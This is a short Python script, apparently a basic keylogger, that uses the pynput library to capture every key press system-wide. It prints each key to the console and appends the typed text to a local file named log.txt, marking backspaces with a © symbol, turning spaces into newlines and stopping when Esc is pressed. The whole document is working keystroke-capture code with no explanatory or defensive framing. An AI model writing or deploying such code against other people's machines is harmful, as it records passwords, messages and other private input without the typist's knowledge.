import pynput

for_backspace = "©"

from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
    global keys,count
    keys.append(key)
    count = count + 1
    print("{0} pressed".format(key))

    if(count>0):
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open("log.txt","a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if(k.find("backspace")>0):
                f.write(for_backspace)
            elif(k.find("space")>0):
                f.write('\n')
            elif(k.find("Key")==-1):
                f.write(k)

def on_release(key):
    if(key==Key.esc):
        return False

with Listener(on_press = on_press, on_release=on_release) as listener:
    listener.join()

